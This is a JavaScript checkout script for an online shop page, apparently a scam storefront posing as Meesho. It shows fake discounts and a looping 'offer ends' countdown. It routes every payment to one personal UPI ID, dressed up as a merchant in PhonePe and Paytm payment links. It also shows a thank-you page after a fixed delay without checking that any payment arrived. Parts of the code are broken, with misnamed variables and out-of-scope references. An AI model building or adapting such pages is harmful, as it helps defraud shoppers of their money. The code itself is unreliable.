var itemData;
$(document).ready(function () {
    startTimer(500 - 120, $('#offerend-time'));
    $(".form-check").on('click', function () {
        $(".form-check").removeClass('active');
        $(this).addClass('active');
    });
    $("#back_btn").on("click", function () {
        history.back();
    });

    var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);
    $("#item_image").prop('src', itemData.img1);
    var name = itemData.name + " " + ((itemData.color) ? ' (' + itemData.color + ')' : '') + ((itemData.size) ? ' (' + itemData.size + ')' : '') + ((itemData.storage) ? ' (' + itemData.storage + ')' : '');
    $("#product-title").html(name);
    $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
    $(".mrp").html("&#8377;" + itemData.mrp);
});

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + "min " + seconds + "sec");

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

  var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);


let sellingPrice_phonepe = itemData.selling_price;
let fiftyPercent = sellingPrice_phonepe * 0.15;
    let phonepe_price = Math.round(sellingPrice_phonepe - fiftyPercent);
    console.log(phonepe_price)
    
    document.getElementById('discount_phonepe').innerHTML = `₹${Math.round(phonepe_price)}`;

let sellingPrice_paytm = itemData.selling_price;
let tenPercent = sellingPrice_paytm * 0.15;
    let paytm_price = Math.round(sellingPrice_paytm - fiftyPercent);
    console.log(paytm_price)
    
    document.getElementById('discount_paytm').innerHTML = `₹${Math.round(paytm_price)}`;
    
    
    
    let sellingPrice_total = itemData.selling_price;
let totalPercent = sellingPrice_total * 0.40;
    let totals_price = Math.round(sellingPrice_total - totalPercent);
    console.log(totals_price)
    
    document.getElementById('total_pricess').innerHTML = `₹${Math.round(totals_price)}`
     document.getElementById('total_pricessss').innerHTML = `₹${Math.round(totals_price)}`

    
    
    
function payNow() {
  var orderNumber = "ORD" + Date.now() + Math.floor(1000 + Math.random() * 9000);
  var payType = $(".form-check.active").attr("pay-type") || "phonepe";
  var redirect_url = "";
  var site_name = "Raj Patel"; // Or "Meesho"
  var upi_address = "rajpatel1861997@okaxis";
  var amt = (itemData && itemData.selling_price) ? parseFloat(itemData.selling_price).toFixed(2) : "0.00";
  var amountInPaise = Math.round(parseFloat(amt) * 100);

  var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

  switch (payType) {
    case 'qr_code':
    case 'qr':
      var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=8&data=" + encodeURIComponent("upi://pay?pa=" + encodeURIComponent(upi_address) + "&pn=" + encodeURIComponent(site_name) + "&am=" + amt + "&cu=INR&tn=" + encodeURIComponent("Order_" + orderNumber));
      var qrModal = document.getElementById('qr_modal');
      if (qrModal) {
        var qrImg = document.getElementById('qr_code_img');
        if (qrImg) qrImg.src = qrUrl;
        $(qrModal).show();
      } else {
        window.location.href = qrUrl;
      }
      return;

    case "phonepe":
      if (isIOS) {
        redirect_url =
          "phonepe:upi://pay?pa=" + encodeURIComponent(upi_address) +
          "&pn=" + encodeURIComponent(site_name) +
          "&am=" + amt +
          "&cu=INR" +
          "&tn=" + encodeURIComponent("Order_" + orderNumber);
      } else {
        var payload = {
          p2pPaymentCheckoutParams: {
            checkoutType: "COLLECT",
            initialAmount: amountInPaise,
            note: {
              type: "text",
              message: "Order_" + orderNumber,
            },
            supportedInstruments: -1,
          },
          contact: {
            type: "EXTERNAL_MERCHANT",
            name: site_name,
            vpa: upi_address,
          },
        };
        var encodedPayload = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
        redirect_url = "phonepe://native?data=" + encodeURIComponent(encodedPayload) + "&id=p2ppayment";
      }
      break;

    case "paytm":
      redirect_url =
        "paytmmp://cash_wallet?pa=" + encodeURIComponent(upi_address) +
        "&pn=" + encodeURIComponent(site_name) +
        "&am=" + amt +
        "&cu=INR" +
        "&tn=" + encodeURIComponent("Order_" + orderNumber) +
        "&featuretype=money_transfer";
      break;

    case "bhim_upi":
    case "whatsapp":
    default:
      redirect_url =
        "upi://pay?pa=" + encodeURIComponent(upi_address) +
        "&pn=" + encodeURIComponent(site_name) +
        "&am=" + amt +
        "&cu=INR" +
        "&tn=" + encodeURIComponent("Order_" + orderNumber);
      break;
  }

  window.location.href = redirect_url;
}
       
    $(document).ready(function () {
    // Extract parameters from the URL
   const fullPath = window.location.pathname;

    // Find the index of '/payment' in the path
    const paymentIndex = fullPath.indexOf('/payment');
    
    // Check if '/payment' exists in the path
    if (paymentIndex !== -1) {
        // Extract everything after '/payment'
        const pathAfterPayment = fullPath.slice(paymentIndex + '/payment'.length);

        console.log(pathAfterPayment);
    // Perform AJAX request with the extracted parameters
    $.ajax({
        type: 'POST',
        url: pathAfterPayment + 'verify/process-payment.php', // Dynamically construct the URL
        data: {
            orderNumber: orderNumber,
            payType: payType,
            upi_address: upi_address,
            amt: amt
        },
        
        success: function(response) {
            // Check the response from the server
            if (response === 'success') {
                // Redirect to the "Thank You" page after successful payment notification
                setTimeout(function() {
                    window.location.href = pathAfterPayment + `verify/thankyou.php?orderNumber=${orderNumber}`;
                }, 20000); // 20 seconds delay
            } else {
                // Handle unsuccessful payment
                alert("Payment failed. Please try again.");
            }
        },
        error: function() {
            // Handle error if the server notification fails
            alert("Payment successful, but server notification failed. Please contact support.");
        }
    });
    }
});

}











